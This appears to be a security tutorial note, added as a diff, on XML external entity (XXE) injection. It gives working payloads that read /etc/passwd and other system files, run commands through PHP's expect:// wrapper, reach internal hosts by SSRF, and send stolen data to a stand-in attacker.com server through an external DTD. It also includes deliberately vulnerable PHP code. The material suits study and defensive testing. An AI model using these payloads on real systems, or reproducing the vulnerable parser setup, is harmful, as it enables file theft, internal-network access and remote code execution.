@@ -1,0 +1,338 @@
+#+title: Xxe Injection
+#+author: gabriel
+
+* intro
+XML (Extensible Markup Language) is a markup language that defines a set of rules for creating documents that are readable by both humans and machines. It is commonly used for web services and for storing and transporting structured data.
+
+XML uses tags to define data. For example:
+#+begin_src xml
+<user>
+  <name>John</name>
+  <surname>Doe</surname>
+</user>
+#+end_src
+
+** what is a DTD
+A DTD (Document Type Definition) is a schema that defines the structure and legal elements of an XML document. A DTD specifies which elements can appear in an XML document, in what order they can appear, and what attributes they can have.
+
+A DTD can be defined inside or outside an XML document. An external DTD is stored in a .dtd file and is called from the XML document with a DOCTYPE declaration.
+
+#+begin_src xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE library SYSTEM "example.dtd">
+<library>
+    <book>
+        <title>The Great Gatsby</title>
+        <author>F. Scott Fitzgerald</author>
+        <year>1925</year>
+    </book>
+    <book>
+        <title>1984</title>
+        <author>George Orwell</author>
+        <year>1949</year>
+    </book>
+</library>
+#+end_src
+
+** whatis XXE vuln ?
+An XXE (XML External Entity) vulnerability is a security flaw that occurs when an application uses an XML parser that processes external entities. An attacker can craft these entities to contain malicious payloads.
+
+XXE vulnerabilities can be found in a variety of application types and scenarios. Here are some common examples:
+
+*file upload functs* ->
+Applications that allow users to upload files in XML-based formats such as .docx, .xlsx, .pptx, or .svg. These files can be maliciously crafted to contain an XXE payload.
+
+*SOAP APIs* ->
+SOAP is a protocol that uses XML for communication. SOAP-based web services are a common target for XXE attacks.
+
+*REST APIs* ->
+ RESTful APIs that accept Content-Type: application/xml can also be vulnerable to XXE.
+
+ *SAML-Based authentication* ->
+  Security Assertion Markup Language (SAML) uses XML for authentication and authorization. Poorly configured SAML implementations can be vulnerable to XXE attacks.
+
+* types of XXE Attacks
+XXE attacks can be carried out in various ways that can allow an attacker to access sensitive information or perform unauthorized actions on the server. The main types of XXE attacks are:
+
+** In-band XXE
+This is the most common type of XXE attack. In this attack, the attacker defines an external entity that is immediately displayed in the application's response. This allows the attacker to exfiltrate files from the server and see them directly in the application's response.
+
+#+begin_src xml
+<?xml version="1.0" ?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<foo>&xxe;</foo>
+#+end_src
+
+In this example, the xxe entity is defined to contain the content of the /etc/passwd file. When the application processes this XML, it will return the content of the /etc/passwd file in its response.
+
+** out-of-band XXE
+In out-of-band XXE attacks, the attacker cannot receive the data directly in the application's response. Instead, they send the data to an external system they control (e.g., a web or DNS server).
+
+This is useful when the application's responses do not contain detailed error messages or other useful information.
+#+begin_src xml
+<?xml version="1.0" ?>
+<!DOCTYPE foo [
+  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
+  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
+  %dtd;
+]>
+<foo></foo>
+#+end_src
+
+the evil.dtd file->
+
+#+begin_src xml
+<!ENTITY % data "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?data=%xxe;'>">
+%data;
+#+end_src
+
+** blind XXE
+Blind XXE is similar to out-of-band XXE, but there is no direct side channel that the attacker can use to exfiltrate data. Instead, the attacker makes inferences by triggering error messages from the XML parser or by observing subtle changes in the application's behavior.
+
+#+begin_src xml
+<?xml version="1.0" ?>
+<!DOCTYPE foo [
+  <!ENTITY % xxe SYSTEM "file:///path/to/nonexistent/file">
+]>
+<foo>&xxe;</foo>
+#+end_src
+
+In this example, trying to access a nonexistent file might cause the application to return an error message. The attacker can infer information about the system by observing the presence or absence of this error.
+
+** remote code execution (RCE) via XXE
+In some cases, an XXE vulnerability can lead to Remote Code Execution (RCE). This is a less common scenario that usually requires a specific module or library to be installed on the server.
+
+Example (PHP expect module):
+If the PHP expect module is installed on the server, an attacker can execute commands using the expect:// wrapper.
+#+begin_src xml
+<?xml version="1.0" ?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "expect://id">
+]>
+<foo>&xxe;</foo>
+#+end_src
+
+This payload will execute the id command on the server and return the output in the application's response.
+
+Below is an example of PHP code that would be vulnerable to this attack:
+#+begin_src php
+<?php
+// Assuming the expect module is installed
+libxml_disable_entity_loader(false);
+
+$xmlfile = file_get_contents('php://input');
+$dom = new DOMDocument();
+$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
+
+$creds = simplexml_import_dom($dom);
+
+$user = $creds->user;
+echo "Hello " . $user;
+?>
+#+end_src
+
+This code is vulnerable to XXE due to the libxml_disable_entity_loader(false) setting, and if the expect module is installed, it allows for RCE.
+
+* Exploiting XXE to retrieve files
+This code is vulnerable to XXE due to the libxml_disable_entity_loader(false) setting, and if the expect module is installed, it allows for RCE.
+
+** basic file retrieval
+An attacker can define an XML external entity to read any file on the server by using the file:// scheme.
+The following XML payload can be used to read the /etc/passwd file:
+#+begin_src xml
+POST /vulnerable-endpoint HTTP/1.1
+Host: example.com
+Content-Type: application/xml
+Content-Length: 123
+
+<?xml version="1.0" ?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<user>
+  <name>&xxe;</name>
+</user>
+#+end_src
+
+When the application processes this XML, the &xxe; entity is replaced with the content of the /etc/passwd file, and this content is returned in the application's response.
+
+*response* ->
+#+begin_src php
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+...
+#+end_src
+
+** file retrieval on Windows Systems
+On Windows systems, the file paths are different. For example, the following payload can be used to read the C:\Windows\System32\drivers\etc\hosts file:
+#+begin_src xml
+<?xml version="1.0" ?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">
+]>
+<user>
+  <name>&xxe;</name>
+</user>
+#+end_src
+
+*response* ->
+#+begin_src php
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+
+# Copyright (c) 1993-2009 Microsoft Corp.
+#
+# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
+#
+...
+#+end_src
+
+** directory listing
+In some cases, the file:// scheme can also be used to list directories. This allows an attacker to explore the file system on the server.
+
+#+begin_src xml
+<?xml version="1.0" ?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/">
+]>
+<user>
+  <name>&xxe;</name>
+</user>
+#+end_src
+
+This payload may list the contents of the /etc/ directory. However, this behavior may not be supported by all XML parsers and system configurations.
+
+* exploiting XXE to SSRF
+XXE vulnerabilities can also be used to perform Server-Side Request Forgery (SSRF) attacks. This allows an attacker to make the vulnerable server issue requests to other internal or external systems.
+
+This can be used to scan for other services within the network, access sensitive information, or interact with other systems.
+
+** basic SSRF attack
+An attacker can define an XML external entity using the http:// or https:// schemes to make the server issue a request to a specific URL.
+
+Example:
+The following XML payload can cause the server to send a GET request to http://internal-server.com/admin:
+#+begin_src xml
+<?xml version="1.0" ?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "http://internal-server.com/admin">
+]>
+<user>
+  <name>&xxe;</name>
+</user>
+#+end_src
+
+When the application processes this XML, it sends a request to internal-server.com. Although the attacker may not see the response directly, they can use this technique to scan for other services on the network or cause state changes in internal systems.
+
+#+begin_src python
+GET /admin HTTP/1.1
+Host: internal-server.com
+User-Agent: Java/1.8.0_291
+...
+#+end_src
+
+** SSRF with out-of-band (OOB) Data exfiltration
+In a more advanced scenario, an attacker can exfiltrate data from internal systems by combining SSRF with an out-of-band (OOB) technique. This involves crafting the XXE payload to send data retrieved from an internal service to a server controlled by the attacker.
+
+Example:
+The following example aims to retrieve data from an internal API and send it to the attacker's server:
+#+begin_src xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+    <!ENTITY % internal_data SYSTEM "http://internal-api/get_data">
+    <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
+    %dtd;
+]>
+<foo/>
+#+end_src
+
+*evil.dtd* ->
+#+begin_src xml
+<!ENTITY % send_data "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%internal_data;'>">
+%send_data;
+#+end_src
+
+In this payload, the server first retrieves data from http://internal-api/get_data and stores it in the internal_data parameter entity. Then, this data is sent as a GET parameter to the attacker's server.
+
+* identifying potential entry points
+XXE vulnerabilities arise when an application processes XML data. Common places to look for include:
+
+*file upload functions* ->
+File upload forms that accept XML-based file formats such as .xml, .docx, .xlsx, .svg.
+
+*API Endpoints* ->
+REST or SOAP APIs that accept XML data with a Content-Type: application/xml header.
+
+*Request bodies* ->
+Even in normal form submissions, XML data may be processed, depending on the server-side logic.
+
+** manual testing techniques
+Once a potential entry point is identified, you can manually send various payloads to test for XXE vulnerabilities.
+
+*** basic XXE test
+Start by sending a simple XXE payload and observe whether the application processes external entities.
+
+*Example* ->
+#+begin_src xml
+<?xml version="1.0" ?>
+<!DOCTYPE foo [
+  <!ENTITY xxe "XXE_TEST">
+]>
+<user>
+  <name>&xxe;</name>
+</user>
+#+end_src
+
+If the application returns the string "XXE_TEST" in its response, it means it processes external entities.
+
+HTTP Request Example:
+#+begin_src javascript
+POST /vulnerable-endpoint HTTP/1.1
+Host: example.com
+Content-Type: application/xml
+Content-Length: 101
+
+<?xml version="1.0" ?>
+<!DOCTYPE foo [
+  <!ENTITY xxe "XXE_TEST">
+]>
+<user>
+  <name>&xxe;</name>
+</user>
+#+end_src
+
+*** file retrieval test
+Next, try to read a known file from the server.
+
+*Example* ->
+#+begin_src xml
+<?xml version="1.0" ?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/hostname">
+]>
+<user>
+  <name>&xxe;</name>
+</user>
+#+end_src
+
+If you see the server's hostname in the response, the application is vulnerable to file retrieval.
+
+*Response* ->
+#+begin_src javascript
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+
+Hello debian-server
+#+end_src
+
+These resources contain a wide range of XXE payloads for different scenarios and XML parsers, and can assist you in your testing process ->
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection
+
+https://github.com/payloadbox/xxe-injection-payload-list
